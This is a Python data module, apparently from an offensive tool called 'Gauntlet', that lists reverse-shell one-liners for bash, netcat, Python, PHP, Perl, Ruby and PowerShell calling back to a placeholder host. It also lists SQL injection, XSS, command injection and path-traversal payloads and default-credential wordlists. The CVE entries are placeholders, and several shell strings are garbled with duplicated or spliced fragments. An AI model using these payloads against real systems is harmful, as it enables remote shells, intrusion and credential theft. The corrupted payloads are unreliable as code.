```python
"""
Gauntlet Payloads Database
"""

# Reverse Shells
SHELLS = [
    {
        "id": 1,
        "name": "Bash TCP",
        "payload": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        "os": "linux"
    },
    {
        "id": 2,
        "name": "Python",
        "payload": "python -c 'import 
socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(socket,subprocess,os;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));o.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "os": "linux"
    },
    {
        "id": 3,
        "name": "PHP",
        "payload": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "os": "linux"
    },
    {
        "id": 4,
        "name": "Netcat",
        "payload": "nc -e /bin/sh {LHOST} {LPORT}",
        "os": "linux"
    },
    {
        "id": 5,
        "name": "Perl",
        "payload": "perl -e 'use 
Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_inSocket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        "os": "linux"
    },
    {
        "id": 6,
        "name": "Ruby",
        "payload": "ruby -rsocket -e 
'c=TCPSocket.new(\"{LHOST}\",{LPORT});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
        "os": "linux"
    },
    {
        "id": 7,
        "name": "PowerShell",
        "payload": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"New-Object 
System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 
0..65535|%{0};while(($n = $stream.Read($bytes, 0, $bytes.Length)) -gt 0){;$data = (New-Object -TypeName 
System.Text.ASCIIEncoding).GetString($bytes,0,$n);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = 
$sendback + 'PS ' + (pwd).Path + '> ';$sent = $stream.Write($bytes,0,(Send-MailMessage -To 
$sendback2.GetBytes($sendback2)));}\" $client.Close()",
        "os": "windows"
    },
    {
        "id": 8,
        "name": "Python (Windows)",
        "payload": "python -c \"import 
socket,subprocess,os;s=socket.socket();s.connect(('{LHOST}',{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),socket,subprocess,os;s=socket.socket();s.connect(('{LHOST}',{LPORT}));osdup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])\"",
        "os": "windows"
    },
]

# Exploits Database
EXPLOITS = [
    {
        "cve": "CVE-2024-0001",
        "name": "Sample Exploit 1",
        "description": "Sample vulnerability description",
        "severity": "critical",
        "platform": "linux"
    },
    {
        "cve": "CVE-2024-0002",
        "name": "Sample Exploit 2",
        "description": "Another vulnerability",
        "severity": "high",
        "platform": "windows"
    },
    {
        "cve": "CVE-2023-XXXX",
        "name": "Common Vulnerability",
        "description": "Common web vulnerability",
        "severity": "medium",
        "platform": "web"
    },
]

# Wordlists
WORDLISTS = {
    "usernames": [
        "admin", "root", "user", "test", "guest", "administrator",
        "operator", "webadmin", "dbadmin", "sysadmin", "master",
        "admin1", "administrator", "root1", "test1", "user123"
    ],
    "passwords": [
        "password", "123456", "12345678", "qwerty", "abc123",
        "monkey", "1234567", "letmein", "trustno1", "dragon",
        "baseball", "iloveyou", "master", "sunshine", "ashley",
        "football", "password1", "shadow", "123123", "654321"
    ],
    "paths": [
        "/admin", "/admin.php", "/administrator", "/login", "/wp-admin",
        "/phpmyadmin", "/backup", "/config", "/.git", "/.env",
        "/api", "/server-status", "/info", "/phpinfo", "/shell",
        "/upload", "/uploads", "/files", "/images", "/cgi-bin"
    ]
}

# Web Payloads
WEB_PAYLOADS = {
    "sql_injection": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "'; DROP TABLE users--",
        "1' AND '1'='1",
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "admin'--",
        "admin' #",
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "'-alert('XSS')-'",
        "\"><script>alert('XSS')</script>",
    ],
    "command_injection": [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "; id",
        "| id",
        "&& whoami",
        "|| whoami",
    ],
    "lfi": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "/etc/shadow",
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
    ]
}

# Get shell by ID
def get_shell(shell_id):
    for shell in SHELLS:
        if shell['id'] == shell_id:
            return shell
    return None

# Get all shells
def get_all_shells():
    return SHELLS

# Get exploits
def get_exploits():
    return EXPLOITS

# Get wordlists
def get_wordlists():
    return WORDLISTS
```
